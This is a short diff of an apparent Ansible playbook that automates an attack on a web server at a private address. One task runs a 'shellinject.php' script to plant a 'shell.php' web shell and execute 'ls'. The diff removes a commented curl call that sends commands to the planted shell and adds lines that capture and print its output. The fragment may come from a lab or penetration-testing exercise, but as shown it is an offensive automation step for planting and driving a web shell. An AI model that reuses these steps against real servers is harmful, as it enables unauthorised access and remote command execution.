@@ -37,5 +37,5 @@
   tasks:
     - name: log in web server and inject it with shell file
       raw: php shellinject.php logs.txt 10.0.0.16/ shell.php ls
-    # - name: run shell command as root on web server
-    #   raw: curl -X GET 10.0.0.16/images/shell.php\?cmd\=ls 
+      register: out
+    - debug: var=out.stdout_lines
